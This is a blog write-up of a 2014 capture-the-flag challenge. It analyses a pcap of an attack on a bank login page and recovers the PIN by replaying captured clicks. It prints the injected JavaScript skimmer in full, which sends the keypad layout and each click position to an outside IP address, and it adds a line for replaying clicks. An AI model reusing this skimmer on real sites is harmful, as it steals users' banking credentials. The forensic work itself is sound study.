---
id: 19
title: 'SU CTF 2014 &#8211; Our bank is yours write up'
date: 2014-09-28T20:54:36+00:00
author: mashhadimj
layout: post
guid: http://mjafar.me/blog/?p=19
permalink: /blog/:year/:month/our-bank-is-yours-write-up/
categories:
  - CTF Writeup
---
The police have arrested a cyber criminal but they don't have a good witness. Just a short capture of his network traffic is available. Is it helpful?

-------

A pcap network traffic log is attached. By opening it in wireshark you could see that an email is sent with a link to <a href="http://ctf.sharif.edu:45656/" target="_blank"> this page</a> that injects the following javascript code into the page.


```javascript
setTimeout("sendmap();",1000);
document.body.addEventListener("click",clickdone,false);
function sendmap(){
  var buttons=document.getElementsByClassName("keypadButtonStyle");
  var keymap="";
  for(var i=0;i<buttons.length;i++)
    keymap+=buttons[i].value;
  var xmlhttp=new XMLHttpRequest();
  xmlhttp.open("GET","http://95.211.102.232:8080/c.php?t=m&v="+keymap,false);
  xmlhttp.send();
}
function clickdone(e){
  var xPosition=e.clientX;
  var yPosition=e.clientY;
  var xmlhttp=new XMLHttpRequest();
  xmlhttp.open("GET","http://95.211.102.232:8080/c.php?t=c&v="+xPosition+","+yPosition,false);
  xmlhttp.send();
}
```

It first sends the mapping of keys to `http://95.211.102.232:8080/c.php` then on each click sends the x and y position of click to that page.

We used the following shell script to find all GET requests to the given address.
```bash
#!/bin/sh

touch bank-followstream.txt
END=$(tshark -r $1 -T fields -e tcp.stream | sort -n | tail -1)
for ((i=0;i<=END;i++)) do
     echo $i
     tshark -r $1 -qz follow,tcp,ascii,$i >> bank-followstream.txt
done

grep "GET /c.php" < bank-followstream.txt
```
Key mapping is `4    1    6    3    7    0    8    9    5    2   Backspace`. With a simple javascript code you can simulate clicks on the original page. After logging in the flag will appear.
This line of javascript (using jQuery) code may be helpful:
```javascript
$(document.elementFromPoint(x, y)).click();
```
